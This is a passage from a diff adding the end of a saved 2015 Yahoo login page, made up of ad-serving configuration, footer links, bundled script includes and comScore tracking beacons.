y5jb20vY3N5bmM/dmVyPTIuMSddLFsnY3N5bmMuZmxpY2tyLmNvbS9jc3luYz92ZXI9Mi4xJywnY3N5bmMueWFob29hcGlzLmNvbS9jc3luYz92ZXI9Mi4xJ10sJ3siMi4xIjoiJmlkPTIzMzUxJnZhbHVlPTlmZnd6NHVuaHBzZ3clMjZvJTNkNCUyNnElM2RBWHZSVEJPY0xTeVozdlNVc0ZHQTg2MXg3X0gtJTI2ZiUzZHgyJTI2diUzZDJac1hhOHRVWGpLMk5OdHJBcjdMJm9wdG91dD1oJTNkMSZ0aW1lb3V0PTE0NDExNzMxMjgmc2lnPTEzajRrNmxsZiJ9Jyl9aWYoYy5hZGRFdmVudExpc3RlbmVyKXtjLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLGgsZmFsc2UpfWVsc2V7aWYoYy5hdHRhY2hFdmVudCl7Yy5hdHRhY2hFdmVudCgib25sb2FkIixoKX1lbHNle2Mub25sb2FkPWh9fX0pKHdpbmRvdyk7CgoKCQogfTsKZHBlci50cmFuc0lEID0iZGFybGFfcHJlZmV0Y2hfMTQ0MTE3MzEyODA1M185NTIyNzE4MThfMSI7Cgo=", "pym": "" } } }
+     </script>
+     <script src="https://s.yimg.com/rq/darla/2-8-9/js/g-r-min.js" type="text/javascript">
+     </script>
+     <script type="text/javascript">
+      var DARLA_CONFIG = {"useYAC":0,"usePE":0,"servicePath":"https:\/\/login.yahoo.com\/sdarla\/php\/fc.php","xservicePath":"","beaconPath":"https:\/\/login.yahoo.com\/sdarla\/php\/b.php","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-sf.html","msgPath":"https:\/\/login.yahoo.com\/sdarla\/2-8-9\/html\/msg.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-csc.html","root":"sdarla","edgeRoot":"http:\/\/l.yimg.com\/rq\/darla\/2-8-9","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9","version":"2-8-9","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/js\/g-r-min.js","beaconsDisabled":true,"rotationTimingDisabled":true,"fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.","positions":{"FOOT9":[],"FOOT":[],"RICH":[]},"lang":"en-JO"}
+     </script>
+     <script>
+      (function(){
+MBR_config.ad_timeout = 4000;MBR_config.ad_type = 6;MBR_config.ad_type2 = 1;
+var contents = document.getElementById('mbr-login-contents-container'), ads_contents = document.getElementById('mbr-login-ad_rich');
+if ((typeof contents == 'object') &amp;&amp; (typeof ads_contents == 'object') &amp;&amp; window.DARLA &amp;&amp; DARLA_CONFIG) { contents.style.display = 'none'; }
+}());
+     </script>
+    </div>
+   </main>
+   <footer>
+    <!-- footer widget -->
+    <div class="mbr-footer pure-u-1" id="mbr-footer">
+     <div>
+     </div>
+     <div>
+     </div>
+     <div>
+      <a target="_blank" href="https://legalredirect.yahoo.com/utos?intl=xe&lang=en-JO">
+       Terms
+      </a>
+      |
+      <a target="_blank" href="https://legalredirect.yahoo.com/privacy?intl=xe&lang=en-JO">
+       Privacy
+      </a>
+     </div>
+    </div>
+    <div class="hidden" id="mbr-login-foot">
+    </div>
+    <div class="mbr-login-foot-9">
+    </div>
+   </footer>
+  </div>
+  <script src="https://s.yimg.com/zz/combo?/sf/assets/mbrlogin/js/3/login-yui-3.18.1-combined-min.js&/ss/rapid-3.19.js&/sf/assets/mbrlogin/js/2/mbr-min.js&/sf/assets/mbrlogin/js/5/cache-min.js&/sf/assets/mbrlogin/js/10/useractivity-min.js&/sf/assets/mbrlogin/js/5/fieldmon-min.js&/sf/assets/mbrlogin/js/1/mbr-desktop-min.js&/sf/assets/mbrlogin/js/desktop/login/54/login-min.js&/sf/assets/mbrlogin/js/mobile/deviceswitcher/1/deviceswitcher-min.js&/sf/assets/mbrlogin/js/common/comscore/1/comscore-min.js&/sf/assets/mbrlogin/js/desktop/lad/10/lad-min.js&kx/yucs/uh3s/uh/414/js/uh-min.js&kx/yucs/uh3s/uh/379/js/escregex-min.js&kx/yucs/uh3s/uh/376/js/persistence-min.js&kx/yucs/uh3s/uh/401/js/menu_group_plugin-min.js&kx/yucs/uh3s/uh/399/js/menu-plugin-min.js&kx/yucs/uh3s/uh/426/js/menu_handler_v2-min.js&kx/yucs/uh3s/uh/376/js/gallery-jsonp-min.js&kx/yucs/uh3s/uh/408/js/logo_debug-min.js&kx/yucs/uh3/uh/js/958/localeDateFormat-min.js&kx/yucs/uh3s/uh/409/js/timestamp_library-min.js&kx/yucs/uh3s/uh/376/js/usermenu_v2-min.js&kx/yucs/uh3/signout-link/10/js/signout-min.js&kx/yucs/uhc/rapid/41/js/uh_rapid-min.js&kx/yucs/uhc/meta/66/js/meta-min.js">
+  </script>
+  <div style="position: absolute !important; visibility: hidden !important" id="yui3-css-stamp" class="">
+  </div>
+  <script charset="utf-8" type="text/javascript">
+   YUI().use('node','node-focusmanager', function(Y) {});
+  </script>
+  <!-- spaceId Base: 150002528, Intl: 360872528-->
+  <script>
+   YUI().use('node', 'event', function (Y) {
+        Y.on("domready", function() {
+            MBR_config.comscore_config = [{
+                c1: "2",
+                c2: "7241469",
+                c5: "360872528",
+                c7: "https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Flogin%3F.src%3Dfpctx%26.intl%3Dxe%26.lang%3Den-JO%26.done%3Dhttps%3A%2F%2Fen-maktoob.yahoo.com%2F%253fp%3Dus",
+                c14: "1010"
+            }];
+            MBR_config.comscore_beacon();
+        });
+    });
+  </script>
+  <noscript>
+   &lt;img src="http://b.scorecardresearch.com/p?c1=2&amp;c2=7241469&amp;c7=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Flogin%3F.src%3Dfpctx%26.intl%3Dxe%26.lang%3Den-JO%26.done%3Dhttps%3A%2F%2Fen-maktoob.yahoo.com%2F%253fp%3Dus&amp;c5=360872528&amp;c14=1010&amp;cv=2.0&amp;cj=1"&gt;
+  </noscript>
+  <div id="darla_csc_holder" class="darla" style="display: none;">
+   <iframe frameborder="no" style="display: none;" id="darla_csc_writer_0" class="darla" src="https://s.yimg.com/rq/darla/2-8-9/html/r-csc.html" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0">
+   </iframe>
+  </div>
+ </body>
+</html>
+<!-- l05.member.ir2.yahoo.com Tue Sep  1 22:52:07 PDT 2015 -->
